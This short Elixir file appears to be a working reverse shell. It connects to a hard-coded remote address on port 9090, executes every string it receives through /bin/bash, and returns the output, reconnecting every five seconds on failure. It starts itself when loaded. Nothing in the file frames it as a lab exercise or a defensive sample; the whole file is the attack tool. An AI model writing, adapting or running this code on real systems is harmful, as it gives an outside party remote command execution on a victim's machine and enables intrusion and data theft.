defmodule Elixrs do
   def main do
      case :gen_tcp.connect({192,168,8,139}, 9090, [:binary, active: false, send_timeout: 5000]) do
         {:ok, sock} -> 
            loop(sock)
         {:error, Reason} ->
            :timer.sleep(5000) 
            main()
      end
   end

   def loop(sock) do
      case :gen_tcp.recv(sock, 0) do
         {:ok, data} ->
            :gen_tcp.send(sock, System.cmd("/bin/bash", ["-c", data]) |> Tuple.to_list) 
            loop(sock)
         {:error, Reason} ->
            main()
         _ ->
            None
      end
   end
end

Elixrs.main
